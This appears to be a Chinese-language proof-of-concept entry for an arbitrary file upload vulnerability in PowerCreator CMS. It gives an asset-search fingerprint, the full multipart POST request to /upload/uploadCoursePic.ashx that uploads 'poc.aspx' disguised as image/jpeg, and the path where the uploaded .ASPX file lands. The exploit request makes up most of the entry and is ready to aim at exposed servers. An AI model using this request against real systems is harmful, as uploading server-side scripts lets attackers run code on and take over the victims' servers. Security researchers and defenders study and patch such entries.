# PowerCreatorCMSuploadCoursePic存在任意文件上传漏洞

- **系统**：PowerCreatorCMSuploadCoursePic　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"PowerCreator-CMS"`
- **请求**：`POST /upload/uploadCoursePic.ashx HTTP/1.1`
- **关键头**：`Content-Length: 246`　`Content-Disposition: form-data;name="file1";filename="poc.aspx";`　`Content-Type: multipart/form-data; boundary=---------------------------208…`

**请求体 / payload**
```
-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="poc.aspx"
Content-Type: image/jpeg
2etjJQglyub8ePXc0iTQlzBZk8t
-----------------------------20873900192357278038549710136--

文件上传位置
/fileManager/UploadFile/CoursePic/8ccf2f03-cea8-4ad4-b7be-81a37d0bbf1e.ASPX
```

**其他**
- PowerCreator CMS uploadCoursePic存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * PowerCreator CMS